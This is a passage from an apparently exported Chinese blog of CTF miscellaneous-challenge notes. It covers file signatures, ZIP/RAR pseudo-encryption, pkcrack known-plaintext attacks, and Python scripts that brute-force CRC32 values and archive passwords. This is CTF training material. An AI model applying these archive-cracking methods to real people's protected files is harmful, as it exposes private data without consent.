class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> wave</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> scipy <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pylab <span class="keyword">import</span> *</span><br><span class="line">  </span><br><span class="line"><span class="comment">#读取wav文件，我这儿读了个自己用python写的音阶的wav</span></span><br><span class="line">filename = <span class="string">&#x27;1.wav&#x27;</span></span><br><span class="line">wavefile = wave.open(filename, <span class="string">&#x27;r&#x27;</span>) <span class="comment"># open for writing</span></span><br><span class="line">  </span><br><span class="line"><span class="comment">#读取wav文件的四种信息的函数。期中numframes表示一共读取了几个frames，在后面要用到滴。</span></span><br><span class="line">nchannels = wavefile.getnchannels()</span><br><span class="line">sample_width = wavefile.getsampwidth()</span><br><span class="line">framerate = wavefile.getframerate()</span><br><span class="line">numframes = wavefile.getnframes()</span><br><span class="line">info= wavefile.getparams()</span><br><span class="line">  </span><br><span class="line">print(<span class="string">&quot;channel&quot;</span>,nchannels)</span><br><span class="line">print(<span class="string">&quot;sample_width&quot;</span>,sample_width)</span><br><span class="line">print(<span class="string">&quot;framerate&quot;</span>,framerate)</span><br><span class="line">print(<span class="string">&quot;numframes&quot;</span>,numframes)</span><br><span class="line">print(<span class="string">&quot;info&quot;</span>,info)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">channel <span class="number">1</span></span><br><span class="line">sample_width <span class="number">2</span></span><br><span class="line">framerate <span class="number">8000</span></span><br><span class="line">numframes <span class="number">159999</span></span><br><span class="line">info _wave_params(nchannels=<span class="number">1</span>, sampwidth=<span class="number">2</span>, framerate=<span class="number">8000</span>, nframes=<span class="number">159999</span>, comptype=<span class="string">&#x27;NONE&#x27;</span>, compname=<span class="string">&#x27;not compressed&#x27;</span>)</span><br></pre></td></tr></table></figure><h5 id="PYC"><a href="#PYC" class="headerlink" title="PYC"></a>PYC</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">03F30D0A</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">t@kali:~&#x2F;桌面&#x2F;steady# file &#x2F;root&#x2F;桌面&#x2F;steady&#x2F;O_O </span><br><span class="line">&#x2F;root&#x2F;桌面&#x2F;steady&#x2F;O_O: python 3.6 byte-compiled</span><br></pre></td></tr></table></figure><h4 id="ELF文件"><a href="#ELF文件" class="headerlink" title="ELF文件"></a>ELF文件</h4><p><code>7F 45 4C 46</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file <span class="string">&#x27;/root/桌面/flag/1&#x27;</span> </span><br><span class="line">/root/桌面/flag/<span class="number">1</span>: ELF <span class="number">64</span>-bit LSB executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.24</span>, BuildID[sha1]=<span class="number">8</span>df45089fa39fec83423ec37a944e81065d16bee, <span class="keyword">not</span> stripped</span><br></pre></td></tr></table></figure><p>使用ideal或者linux直接打开。</p><h4 id="vmdk"><a href="#vmdk" class="headerlink" title="vmdk"></a>vmdk</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@root:~&#x2F;桌面&#x2F;flag# file &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;_mianju.jpg.extracted&#x2F;flag.vmdk&#39; </span><br><span class="line">&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;_mianju.jpg.extracted&#x2F;flag.vmdk: VMware4 disk image</span><br></pre></td></tr></table></figure><p>vmdk也可以用7z解压。</p><h4 id="avi"><a href="#avi" class="headerlink" title="avi"></a>avi</h4><p>视频文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;output&#x2F;zip&#x2F;里面都是出题人.jpg&#39; </span><br><span class="line">&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;output&#x2F;zip&#x2F;里面都是出题人.jpg: RIFF (little-endian) data, AVI, 720 x 480, ~30 fps, video: uncompressed, audio: uncompressed PCM (stereo, 48000 Hz)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">52 49 46 46 1C 7D 7D 02</span><br></pre></td></tr></table></figure><p>elf</p><p>可以直接在linux下运行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady$ file &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;output&#x2F;zip&#x2F;hidden_binary</span><br><span class="line">&#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;output&#x2F;zip&#x2F;hidden_binary: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib64&#x2F;ld-linux-x86-64.so.2, BuildID[sha1]&#x3D;101705e6f60a300ab34f377a87fdb67f92996732, for GNU&#x2F;Linux 3.2.0, not stripped</span><br></pre></td></tr></table></figure><h3 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h3><h4 id="01editor"><a href="#01editor" class="headerlink" title="01editor"></a>01editor</h4><p><img src="C:\Users\12521\AppData\Roaming\Typora\typora-user-images\image-20201030154428607.png" alt="image-20201030154428607"></p><p>可以使用搜索功能搜索十六进制和ascii，搜索-&gt;查找。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/28.png" alt="28"></p><p>更换编码方式。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/47.png" alt="47"></p><h4 id="notepad"><a href="#notepad" class="headerlink" title="notepad++"></a>notepad++</h4><h5 id="解码"><a href="#解码" class="headerlink" title="解码"></a>解码</h5><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/59.png" alt="59"></p><h5 id="标记替换功能"><a href="#标记替换功能" class="headerlink" title="标记替换功能"></a>标记替换功能</h5><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/60.png" alt="60"></p><h5 id="转换大小写"><a href="#转换大小写" class="headerlink" title="转换大小写"></a>转换大小写</h5><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/61.png" alt="61"></p><h5 id="生成md5"><a href="#生成md5" class="headerlink" title="生成md5"></a>生成md5</h5><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/62.png" alt="62"></p>]]></content>
      
      
      <categories>
          
          <category> CTF-杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-杂项 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-杂项题总结</title>
      <link href="2019/05/10/CTF-%E6%9D%82%E9%A1%B9%E9%A2%98%E6%80%BB%E7%BB%93/"/>
      <url>2019/05/10/CTF-%E6%9D%82%E9%A1%B9%E9%A2%98%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-杂项"><a href="#CTF-杂项" class="headerlink" title="CTF-杂项"></a>CTF-杂项</h1><h2 id="压缩包"><a href="#压缩包" class="headerlink" title="压缩包"></a>压缩包</h2><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>注释藏头flag，查看注释可以放入winhex查看十六进制的末尾(最好使用这种方式，因为有时候压缩包注释可能是隐藏的)，或者直接压缩软件查看十六进制。如果遇到隐藏的注释，可以放入sublim或者notepad++。</p><p>如果RAR压缩包中有注释的话，在winhex中的ascii中会有CMT字段。</p><h3 id="zipinfo查看元数据"><a href="#zipinfo查看元数据" class="headerlink" title="zipinfo查看元数据"></a>zipinfo查看元数据</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady$ zipinfo -v &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;1.zip</span><br><span class="line">Central directory entry #1:</span><br><span class="line">---------------------------</span><br><span class="line"></span><br><span class="line">  1.py</span><br><span class="line"></span><br><span class="line">  offset of local header from start of archive:   0</span><br><span class="line">                                                  (0000000000000000h) bytes</span><br><span class="line">  file system or operating system of origin:      MS-DOS, OS&#x2F;2 or NT FAT</span><br><span class="line">  version of encoding software:                   6.3</span><br><span class="line">  minimum file system compatibility required:     MS-DOS, OS&#x2F;2 or NT FAT</span><br><span class="line">  minimum software version required to extract:   2.0</span><br><span class="line">  compression method:                             deflated</span><br><span class="line">  compression sub-type (deflation):               normal</span><br><span class="line">  file security status:                           not encrypted</span><br><span class="line">  extended local header:                          no</span><br><span class="line">  file last modified on (DOS date&#x2F;time):          2020 Nov 6 11:55:08</span><br><span class="line">  32-bit CRC value (hex):                         01e344f3</span><br><span class="line">  compressed size:                                385 bytes</span><br><span class="line">  uncompressed size:                              771 bytes</span><br><span class="line">  length of filename:                             4 characters</span><br><span class="line">  length of extra field:                          36 bytes</span><br><span class="line">  length of file comment:                         0 characters</span><br><span class="line">  disk number on which file begins:               disk 1</span><br><span class="line">  apparent file type:                             binary</span><br><span class="line">  non-MSDOS external file attributes:             000000 hex</span><br><span class="line">  MS-DOS file attributes (20 hex):                arc </span><br><span class="line"></span><br><span class="line">  The central-directory extra field contains:</span><br><span class="line">  - A subfield with ID 0x000a (PKWARE Win32) and 32 data bytes.  The first</span><br><span class="line">    20 are:   00 00 00 00 01 00 18 00 d0 b0 f5 9d f0 b3 d6 01 d0 b0 f5 9d.</span><br><span class="line"></span><br><span class="line">  There is no file comment.</span><br></pre></td></tr></table></figure><h3 id="压缩包解压"><a href="#压缩包解压" class="headerlink" title="压缩包解压"></a>压缩包解压</h3><p>大多是使用python自动化解压，常用的python库为<code>zipfile</code>、<code>unrar</code>。</p><p>比如：</p><p>直接批量读取文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">32</span>):</span><br><span class="line">f=open(<span class="string">&#x27;C:/Users/12521/Desktop/subject/&#x27;</span>+str(i)+<span class="string">&#x27;/&#x27;</span>+str(i)+<span class="string">&#x27;.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">flag+=f.read()</span><br><span class="line">print(base64.b64decode(flag))</span><br></pre></td></tr></table></figure><p>批量解压带有密码的压缩包，文件名字就是压缩包的密码(zip、rar同理)。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> unrar <span class="keyword">import</span> rarfile</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unzip</span>(<span class="params">zipname</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        passwd = zipname[<span class="number">0</span>:<span class="number">6</span>]</span><br><span class="line">        zf = rarfile.RarFile(<span class="string">&#x27;C:/Users/12521/gif/&#x27;</span>+zipname,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">        zf.extractall(<span class="string">&#x27;./gif/&#x27;</span>,pwd=passwd)</span><br><span class="line"><span class="comment">#        zf.close()</span></span><br><span class="line">        os.remove(zipname)</span><br><span class="line">        zipname = zf.namelist()[<span class="number">0</span>].replace(<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">        print(zipname)</span><br><span class="line">unzip(<span class="string">&quot;flag.rar&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="伪加密ZIP"><a href="#伪加密ZIP" class="headerlink" title="伪加密ZIP"></a>伪加密ZIP</h3><p>总结：通过<strong>压缩源文件目录区50 4B 01 02 1F 00 14 00 0奇/偶 00 来表示是否加密</strong>。</p><h3 id="伪加密RAR"><a href="#伪加密RAR" class="headerlink" title="伪加密RAR"></a>伪加密RAR</h3><p>RAR的标记块和结束块都是固定的7字节序列，分别为0x52 61 72 21 1A 07 00和0xC4 3D 7B 00 40 07 00。文件块这边要注意一下HEAD_FLAGS这个头部，其中HEAD_FLAGS的低三位代表加密标志，此位若被置为1，则文件使用了基于密钥的加密。</p><h3 id="明文攻击"><a href="#明文攻击" class="headerlink" title="明文攻击"></a>明文攻击</h3><p>前提：</p><p>有一个已知的文件，然后加密的压缩包中也有一个我们已知的文件，这时候我们可以尝试明文攻击。</p><p>攻击方式：</p><p>首先我们需要把我们的已知的文件使用winrar进行压缩，这里必须使用winrar文件，而且我们需要保证我们手动压缩的文件和我们需要解密的文件后缀以及压缩方式是一样的。</p><p>这里使用工具可以直接破解。如果工具提示无法载入，可以使用winrar的修复功能对压缩包进行修复。</p><h4 id="两个文件"><a href="#两个文件" class="headerlink" title="两个文件"></a>两个文件</h4><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/1.png" alt="1"></p><p>具体的文件拓扑图</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/2.png" alt="2"></p><p>明文攻击的具体特点就是敏感文件的CRC值是一样的。这里我们可以使用WINRA工具进行查看。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/3.png" alt="3"></p><h4 id="只有一个文件"><a href="#只有一个文件" class="headerlink" title="只有一个文件"></a>只有一个文件</h4><p>手动生成一个文件然后<code>rbkcrack.exe</code>进行破解。</p><h4 id="kali-明文攻击"><a href="#kali-明文攻击" class="headerlink" title="kali 明文攻击"></a>kali 明文攻击</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;bin$ .&#x2F;pkcrack -c &quot;logo.png&quot; -p logo.png  -C &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;flag.zip -P &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;logo.zip -d .&#x2F;1.zip</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-C:要破解的目标文件(含路径)</span><br><span class="line"></span><br><span class="line">-c:破解文件中的明文文件的名字(其路径不包括系统路径,从zip文件一层开始)</span><br><span class="line"></span><br><span class="line">-P:压缩后的明文文件</span><br><span class="line"></span><br><span class="line">-p:压缩的明文文件中明文文件的名字(也就是readme.txt在readme.zip中的位置)</span><br><span class="line">-d:指定文件名及所在的绝对路径，将解密后的zip文件输出</span><br></pre></td></tr></table></figure><h3 id="CRC爆破高度"><a href="#CRC爆破高度" class="headerlink" title="CRC爆破高度"></a>CRC爆破高度</h3><p>修改图片高度，当图片高度出现问题的时候，我们需要根据CRC值爆破出高度，修改高度拿到flag。并且图片高度出现问题的时候，在linux下，图片无法正常打开。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/5.png" alt="5"></p><p>使用脚本根据CRC的值爆破出正常的高度</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">p=<span class="number">0</span></span><br><span class="line">m = open(<span class="string">&quot;flag.png&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5000</span>):</span><br><span class="line">    <span class="keyword">if</span>(p==<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">5000</span>):</span><br><span class="line">        c = m[<span class="number">12</span>:<span class="number">16</span>] + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, i) + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, j)+m[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">        crc = binascii.crc32(c) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="keyword">if</span> crc == <span class="number">0x3d9a65d0</span>:</span><br><span class="line">            p=<span class="number">1</span></span><br><span class="line">            <span class="comment">#print(c)</span></span><br><span class="line">            print(hex(i),hex(j))</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="CRC爆破文件内容"><a href="#CRC爆破文件内容" class="headerlink" title="CRC爆破文件内容"></a>CRC爆破文件内容</h3><p>CRC校验实用程序库，在数据存储和数据通讯领域，为了保证数据的正确，就不得不采用检错的手段。 在诸多检错手段中，CRC是最著名的一种。CRC的全称是循环冗余校验。 在产生CRC32时，源数据块的每一位都参与了运算，因此即使数据块中只有一位发生改变也会得到不同 的CRC32值，利用这个原理我们可以直接爆破出加密文件中的内容。 每个文件都有唯一的CRC32值，即便数据中一个bit发生变化，也会导致CRC32值不同。若是知道一段数 据的长度和CRC32值，便可穷举数据，与其CRC32对照，以此达到暴力猜解的目的。但限于CPU的能 力，通常只适用于较小文本文件。</p><p>通常情况下加密文件一般比较小，可以爆破CRC的值。而且爆破crc的位数通常与文件的大小有关。</p><h4 id="编写脚本"><a href="#编写脚本" class="headerlink" title="编写脚本"></a>编写脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">s=string.printable</span><br><span class="line">c =[<span class="number">0xF3B61B38</span>,<span class="number">0xF3B61B38</span>,<span class="number">0X6ABF4A82</span>,<span class="number">0X5ED1937E</span>,<span class="number">0X09b9265b</span>,<span class="number">0x84b12bae</span>,<span class="number">0x70659eff</span>,<span class="number">0x90b077e1</span>,<span class="number">0x6abf4a82</span>]</span><br><span class="line">password = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> crc <span class="keyword">in</span> c:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> crc==(binascii.crc32(i.encode())&amp;<span class="number">0xffffffff</span>):</span><br><span class="line">            password =password + i</span><br><span class="line">print(password)</span><br></pre></td></tr></table></figure><p>自动提取文件的CRC值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">s=string.printable</span><br><span class="line">f = zipfile.ZipFile(<span class="string">&quot;flag.zip&quot;</span>)</span><br><span class="line">l = f.namelist()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;.txt&quot;</span> <span class="keyword">in</span> i:</span><br><span class="line">            <span class="keyword">if</span>(f.getinfo(i).CRC==binascii.crc32(j.encode())):</span><br><span class="line">                print(j)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackCrc</span>(<span class="params">crc</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> p <span class="keyword">in</span> dic:</span><br><span class="line">                <span class="keyword">for</span> q <span class="keyword">in</span> dic:</span><br><span class="line">                    s = i + j + p + q</span><br><span class="line">                    <span class="keyword">if</span> crc == (binascii.crc32(s) &amp; <span class="number">0xffffffff</span>):</span><br><span class="line">                        f.write(s)</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackZip</span>():</span></span><br><span class="line">    <span class="keyword">for</span> I <span class="keyword">in</span> range(<span class="number">68</span>):</span><br><span class="line">        file = <span class="string">&#x27;123/out&#x27;</span> + str(I) + <span class="string">&#x27;.zip&#x27;</span></span><br><span class="line">        f = zipfile.ZipFile(file, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">        GetCrc = f.getinfo(<span class="string">&#x27;data.txt&#x27;</span>)</span><br><span class="line">        crc = GetCrc.CRC</span><br><span class="line">        CrackCrc(crc)</span><br><span class="line"></span><br><span class="line">dic = string.ascii_letters + string.digits + <span class="string">&#x27;+/=&#x27;</span></span><br><span class="line">f = open(<span class="string">&#x27;out.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">CrackZip()</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><h4 id="crc32-py"><a href="#crc32-py" class="headerlink" title="crc32.py"></a>crc32.py</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">python3 crc32.py reverse <span class="number">0x15b89588</span></span><br><span class="line"><span class="number">4</span> bytes: &#123;<span class="number">0xc9</span>, <span class="number">0xbf</span>, <span class="number">0xd6</span>, <span class="number">0x30</span>&#125;</span><br><span class="line">verification checksum: <span class="number">0x15b89588</span> (OK)</span><br><span class="line">alternative: AKjKcy (OK)</span><br><span class="line">alternative: BVptH1 (OK)</span><br><span class="line">alternative: FRmuIR (OK)</span><br><span class="line">alternative: Ka6j7X (OK)</span><br><span class="line">alternative: ND4JDn (OK)</span><br><span class="line">alternative: SgZWO3 (OK)</span><br><span class="line">alternative: WcGVNP (OK)</span><br><span class="line">alternative: _iQ5Bx (OK)</span><br><span class="line">alternative: bYCMs4 (OK)</span><br><span class="line">alternative: c5qQli (OK)</span><br><span class="line">alternative: d093GV (OK)</span><br><span class="line">alternative: oKFBdr (OK)</span><br><span class="line">alternative: shint6 (OK)//敏感字符</span><br><span class="line">alternative: wltouU (OK)</span><br></pre></td></tr></table></figure><p>会列举出文件内容，这时候我们需要找到敏感字符。</p><h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3><p>使用暴力破解的时候，如果我们无法载入文件，如图</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/10.png" alt="10"></p><p>我们可以使用winRAR工具进行压缩包修复。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/11.png" alt="11"></p><h4 id="掩码攻击"><a href="#掩码攻击" class="headerlink" title="掩码攻击"></a>掩码攻击</h4><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/9.png" alt="9"></p><h3 id="关于压缩包的十六进制"><a href="#关于压缩包的十六进制" class="headerlink" title="关于压缩包的十六进制"></a>关于压缩包的十六进制</h3><h4 id="十六进制反序"><a href="#十六进制反序" class="headerlink" title="十六进制反序"></a>十六进制反序</h4><p>使用脚本反序</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">steady_str=<span class="string">&#xx27;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(steady_str),<span class="number">4</span>):</span><br><span class="line">    steady_str1=steady_str[i:i+<span class="number">4</span>]</span><br><span class="line">    steady_str2=steady_str1[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">    steady_str3=steady_str1[<span class="number">2</span>:<span class="number">4</span>]</span><br><span class="line">    flag+=steady_str3+steady_str2</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>直接使用winhex反序</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/12.png" alt="12"></p><h4 id="十六进制异或"><a href="#十六进制异或" class="headerlink" title="十六进制异或"></a>十六进制异或</h4><p>题目会提示<code>0ff</code>，十六进制与<code>0xff</code>异或。</p><p>使用脚本异或、或者winhex功能(如上)。</p><h3 id="压缩包中藏有数据"><a href="#压缩包中藏有数据" class="headerlink" title="压缩包中藏有数据"></a>压缩包中藏有数据</h3><h4 id="01editoer"><a href="#01editoer" class="headerlink" title="01editoer"></a>01editoer</h4><p>使用该软件打开如果提示载入错误，说明该压缩包藏有文件。使用binwalk等等进行分离。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/15.png" alt="15"></p><h3 id="压缩包NTFS隐写"><a href="#压缩包NTFS隐写" class="headerlink" title="压缩包NTFS隐写"></a>压缩包NTFS隐写</h3><p>压缩包也可能会有NTFS隐写，使用win命令<code>dir /r</code>或者<code>lads.exe</code>查看是否有NTFS隐写。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>1、有时候压缩包打不开、压缩包有密码，可以直接使用<code>rar</code>进行解压，如果要求输入密码可以直接空密码就可以解压出文件。</p><p>2、压缩包如果有注释，winhex中的ascii会有CMT字段。</p><h2 id="画图"><a href="#画图" class="headerlink" title="画图"></a>画图</h2><h3 id="三坐标画图"><a href="#三坐标画图" class="headerlink" title="三坐标画图"></a>三坐标画图</h3><p>判断坐标大小，求出图片的长度和宽度。</p><p>首先notepad++求行号。</p><p>其次python脚本求图片大小。</p><figure class="highlight 